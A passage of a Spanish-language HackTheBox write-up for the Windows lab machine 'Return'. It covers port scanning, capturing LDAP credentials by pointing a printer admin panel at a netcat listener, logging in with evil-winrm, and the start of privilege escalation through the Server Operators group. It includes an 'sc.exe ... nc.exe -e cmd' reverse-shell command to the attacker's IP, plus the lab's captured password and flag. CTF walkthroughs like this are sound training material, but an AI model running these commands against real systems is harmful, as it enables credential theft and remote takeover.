@@ -1,0 +1,467 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - Return (easy) · MiguelRega7</title>
+<meta name="description" content="- En este post vamos a estar resolviendo la maquina Return de Hackthebox donde vamos a estar enumerando primero por SMB pero no encontramos nada después por el puerto 80 que esta c"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - Return (easy)</h1><div class="meta"><span>◷</span><time>2024-03-29</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">- En este post vamos a estar resolviendo la maquina Return de Hackthebox donde vamos a estar enumerando primero por SMB pero no encontramos nada después por el puerto 80 que esta c.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#enumeracion">Enumeracion</a><a href="#ldap-credentials">LDAP Credentials</a><a href="#shell-as-svc-printer">Shell as svc-printer</a><a href="#user-flag">User flag</a><a href="#escalada-de-privilegios">Escalada de privilegios</a><a href="#shell-as-nt-authority-system">Shell as nt authority system</a><a href="#root-flag">root flag</a></aside><article class="article-content" id="top"><p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/defa149ea7e259a4709a03a5825e970d.png">
+</p>
+
+<ul>
+<li>En este post vamos a estar resolviendo la maquina Return de Hackthebox donde vamos a estar enumerando primero por SMB pero no encontramos nada después por el puerto 80 que esta corriendo un servicio web encontraremos un servicio de una impresora el cual podemos modificar un campo el cual pondremos nuestra ip y nos pondremos en escucha en un puerto para que nos obtener credenciales de un usuario al igual usaremos wireshark para analizar el trafico y ver como viaja todo por detrás con las credenciales nos conectaremos con evil-wirm y para la escalada de privilegios estaremos abusando de que estamos en el grupo Server Operators y podemos para y arrancar servicios.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ping -c 1 10.129.95.241
+PING 10.129.95.241 (10.129.95.241) 56(84) bytes of data.
+64 bytes from 10.129.95.241: icmp_seq=1 ttl=127 time=152 ms
+
+--- 10.129.95.241 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 152.077/152.077/152.077/0.000 ms
+❯ whichSystem.py 10.129.95.241
+
+10.129.95.241 (ttl -&gt; 127): Windows
+</code></pre></div></div>
+<h2 id="portscan">PortScan</h2>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49674,49675,49677,49680,49697 10.129.95.241 -oN targeted
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-20 19:21 CST
+Nmap scan report for 10.129.95.241
+Host is up (0.15s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: HTB Printer Admin Panel
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-21 01:40:26Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+49680/tcp open  msrpc         Microsoft Windows RPC
+49697/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+|_clock-skew: 18m32s
+| smb2-time: 
+|   date: 2023-07-21T01:41:23
+|_  start_date: N/A
+</code></pre></div></div>
+<h2 id="enumeracion">Enumeracion</h2>
+<ul>
+<li>Tenemos varios puertos abiertos pero vamos a comenzar viendo a que nos estamos enfrentando.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ crackmapexec smb 10.129.95.241
+SMB         10.129.95.241   445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
+</code></pre></div></div>
+<ul>
+<li>Vamos a comenzar por <code>smb</code> primero vamos a ver si podemos ver recursos compartidos podemos hacerlo con la misma herramienta <code>crackmapexec</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ crackmapexec smb 10.129.95.241 --shares
+SMB         10.129.95.241   445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
+SMB         10.129.95.241   445    PRINTER          [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
+</code></pre></div></div>
+<ul>
+<li>Pero nada bueno podemos probar con otras herramientas.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ smbmap -H 10.129.95.241
+[+] IP: 10.129.95.241:445	Name: 10.129.95.241                                     
+❯ smbclient -L 10.129.95.231 -N
+do_connect: Connection to 10.129.95.231 failed (Error NT_STATUS_HOST_UNREACHABLE)
+</code></pre></div></div>
+<ul>
+<li>Pues bueno vimos que el puerto <code>80</code> esta abierto vamos a ver el contenido de lo que existe en la web.</li>
+</ul>
+<div class="code-window" data-language="Ruby"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Ruby</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-ruby">❯ whatweb http://10.129.95.241
+http://10.129.95.241 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.95.241], Microsoft-IIS[10.0], PHP[7.4.13], Script, Title[HTB Printer Admin Panel], X-Powered-By[PHP/7.4.13]
+</code></pre></div></div>
+<ul>
+<li>Esto es lo que hay en la <code>web</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/return/web1.png">
+</p>
+
+<ul>
+<li>Pues como tal es una impresora si revisamos las <strong>extensiones</strong> vemos que <code>settings.php</code> encontramos un nombre de usuario.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/return/web2.png">
+</p>
+
+<ul>
+<li>Vamos aplicar <code>Fuzzing</code> para ver si es la única <strong>ruta</strong> interesante.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ feroxbuster -t 200 -x php,txt,html -u http://10.129.95.241
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben &quot;epi&quot; Risher 🤓                 ver: 2.3.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.129.95.241
+ 🚀  Threads               │ 200
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.3.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 💲  Extensions            │ [php, txt, html]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+301        2l       10w      151c http://10.129.95.241/images
+301        2l       10w      151c http://10.129.95.241/Images
+200     1345l     2796w    28274c http://10.129.95.241/index.php
+200     1376l     2855w    29090c http://10.129.95.241/settings.php
+301        2l       10w      151c http://10.129.95.241/IMAGES
+200     1376l     2855w    29090c http://10.129.95.241/Settings.php
+200     1345l     2796w    28274c http://10.129.95.241/Index.php
+[####################] - 2m    479984/479984  0s      found:7       errors:134    
+[####################] - 2m    119996/119996  688/s   http://10.129.95.241
+[####################] - 2m    119996/119996  690/s   http://10.129.95.241/images
+[####################] - 2m    119996/119996  688/s   http://10.129.95.241/Images
+[####################] - 2m    119996/119996  708/s   http://10.129.95.241/IMAGES
+</code></pre></div></div>
+<ul>
+<li>Pero bueno no vemos nada interesante si inspeccionamos la parte de <code>password</code> vemos que no solo <code>*</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/return/web3.png">
+</p>
+
+<h2 id="ldap-credentials">LDAP Credentials</h2>
+<ul>
+<li>Algo que podemos hacer es cambiar el <code>Server Address</code> a poner nuestra <code>IP</code> y estar en escucha por el puerto <code>389</code> con <code>netcat</code> para ver si recibimos algo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ nc -nlvp 389
+Listening on 0.0.0.0 389
+</code></pre></div></div>
+<ul>
+<li>Al igual que podemos estar capturando trafico para analizar la captura con <code>wireshark</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ tcpdump -i tun0 -w Captura.cap -v
+tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+Got 0
+</code></pre></div></div>
+<ul>
+<li><p>Ahora solo le damos a <code>update</code>.</p>
+</li>
+<li><p>Y recibimos al parecer una contraseña.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ nc -nlvp 389
+Listening on 0.0.0.0 389
+Connection received on 10.129.95.241 55720
+0*`%return\svc-printer
+                      1edFg43012!!
+</code></pre></div></div>
+<ul>
+<li>Y también recibimos trafico.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ tcpdump -i tun0 -w Captura.cap -v
+tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+^C14 packets captured
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos abrir la captura con <code>wireshark</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ wireshark -r Captura.cap &amp;&gt;/dev/null &amp; disown
+[1] 56513
+</code></pre></div></div>
+<ul>
+<li>Vemos que las credenciales son de <code>ldap</code> <code>1edFg43012!!</code> esta realizando una <code>autenticacion</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/return/web5.png">
+</p>
+
+<ul>
+<li>Vamos a ver si las credenciales se reutilizan y podemos ver recursos compartidos por <code>smb</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ crackmapexec smb 10.129.95.241 -u svc-printer -p '1edFg43012!!'
+SMB         10.129.95.241   445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
+SMB         10.129.95.241   445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
+</code></pre></div></div>
+<ul>
+<li>Ahora podemos ver los recursos compartidos por <code>smb</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ smbclient -L //10.129.95.241/ -U svc-printer
+Password for [WORKGROUP\svc-printer]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+</code></pre></div></div>
+<ul>
+<li>Pero como tal no hay un recursos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ crackmapexec smb 10.129.95.241 -u svc-printer -p '1edFg43012!!' --shares
+SMB         10.129.95.241   445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
+SMB         10.129.95.241   445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
+SMB         10.129.95.241   445    PRINTER          [+] Enumerated shares
+SMB         10.129.95.241   445    PRINTER          Share           Permissions     Remark
+SMB         10.129.95.241   445    PRINTER          -----           -----------     ------
+SMB         10.129.95.241   445    PRINTER          ADMIN$          READ            Remote Admin
+SMB         10.129.95.241   445    PRINTER          C$              READ,WRITE      Default share
+SMB         10.129.95.241   445    PRINTER          IPC$            READ            Remote IPC
+SMB         10.129.95.241   445    PRINTER          NETLOGON        READ            Logon server share 
+SMB         10.129.95.241   445    PRINTER          SYSVOL          READ            Logon server share 
+</code></pre></div></div>
+<h2 id="shell-as-svc-printer">Shell as svc-printer</h2>
+<ul>
+<li>Si verificamos si las credenciales se reutilizan para conectarnos con <code>evil-winrm</code> vemos que si.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ crackmapexec winrm 10.129.95.241 -u svc-printer -p '1edFg43012!!'
+SMB         10.129.95.241   5985   PRINTER          [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)
+HTTP        10.129.95.241   5985   PRINTER          [*] http://10.129.95.241:5985/wsman
+WINRM       10.129.95.241   5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
+</code></pre></div></div>
+<ul>
+<li>Ahora nos conectamos y estamos en la maquina victima.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; whoami
+return\svc-printer
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::e8
+   IPv6 Address. . . . . . . . . . . : dead:beef::f08b:84bd:2540:f169
+   Link-local IPv6 Address . . . . . : fe80::f08b:84bd:2540:f169%10
+   IPv4 Address. . . . . . . . . . . : 10.129.95.241
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:7437%10
+                                       10.129.0.1
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; 
+</code></pre></div></div>
+<h2 id="user-flag">User flag</h2>
+<ul>
+<li>Ahora buscamos la <strong>flag</strong> y podemos verla.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; type C:\Users\svc-printer\Desktop\user.txt
+43223ad01387c3d15f47aed81648bfaa
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; 
+</code></pre></div></div>
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+<ul>
+<li>Vemos que tenemos varios privilegios entre ellos uno interesante es este <code>SeLoadDriverPrivilege</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                         State
+============================= =================================== =======
+SeMachineAccountPrivilege     Add workstations to domain          Enabled
+SeLoadDriverPrivilege         Load and unload device drivers      Enabled
+SeSystemtimePrivilege         Change the system time              Enabled
+SeBackupPrivilege             Back up files and directories       Enabled
+SeRestorePrivilege            Restore files and directories       Enabled
+SeShutdownPrivilege           Shut down the system                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
+SeTimeZonePrivilege           Change the time zone                Enabled
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; 
+</code></pre></div></div>
+<ul>
+<li>Estamos en varios grupos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; 
+</code></pre></div></div>
+<ul>
+<li>Estamos en el grupo <code>server operators</code> <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators</a>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/return/web6.png">
+</p>
+
+<ul>
+<li><p>Tenemos la capacidad de parar y arrancar un servicio como nos dicen el la web.</p>
+</li>
+<li><p>Lo que vamos a hacer primero es subir el <code>netcat</code>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; upload nc.exe
+                                        
+Info: Uploading /home/miguel7/Hackthebox/Return/nmap/nc.exe to C:\Users\svc-printer\Documents\nc.exe
+                                        
+Data: 37544 bytes of 37544 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; 
+</code></pre></div></div>
+<p>-Vamos a crear un servicio que haga que nos envié una reverse shell a nuestro equipo.</p>
+<ul>
+<li>Pero nos dice que no se puede.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; sc.exe create reverse binPath=&quot;C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.14.14 443&quot;
+[SC] OpenSCManager FAILED 5:
+
+Access is denied.
+
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; 
+</code></pre></div></div>
+<h2 id="shell-as-nt-authority-system">Shell as nt authority system</h2>
+<ul>
+<li>Como tenemos la capacidad de parar y arrancar servicios vamos a manipular el de una que ya exista.</li>
+</ul>
